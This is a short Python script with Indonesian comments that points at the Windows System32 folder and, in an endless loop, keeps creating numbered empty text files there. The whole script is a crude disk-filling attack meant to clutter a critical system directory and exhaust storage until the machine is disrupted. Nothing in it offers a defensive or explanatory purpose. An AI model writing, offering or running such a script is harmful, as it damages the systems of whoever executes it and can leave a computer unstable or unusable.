import os
# Nama direktori tempat file-file akan disimpan
direktori = "C:\Windows\System32"

# Membuat direktori jika belum ada
if not os.path.exists(direktori):
    os.makedirs(direktori)

# Membuat file kosong dengan nama yang berbeda-beda hingga tak terhingga
i = 1
while True:
    nama_file = f"{direktori}/file_{i}.txt"
    with open(nama_file, "w"):
        pass
    i += 1

    
